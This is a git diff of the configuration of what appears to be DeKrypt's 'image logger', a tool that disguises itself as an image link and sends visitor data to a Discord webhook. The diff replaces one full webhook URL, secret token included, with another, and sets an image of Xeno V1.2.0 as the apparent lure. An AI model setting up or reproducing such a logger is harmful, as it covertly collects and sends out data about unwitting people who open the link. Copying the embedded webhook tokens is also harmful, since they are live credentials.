@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1375462567786447000/05Yay2wQTecmKVnwBTCbHFze59lAV9Z6uMpBioQ3XVJxBM96EK6TR5j2At1Do-uu5wXn",
+    "webhook": "https://discord.com/api/webhooks/1375744166021042318/AWs4yIswuiwJ_qT06zqJ-ZhoNfLwB9pONFmcHMBMdEMIZvAlHS3VSLTBhKWmjawejifT",
     "image": "https://www.xeno.onl/images/Xeno-V1.2.0.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
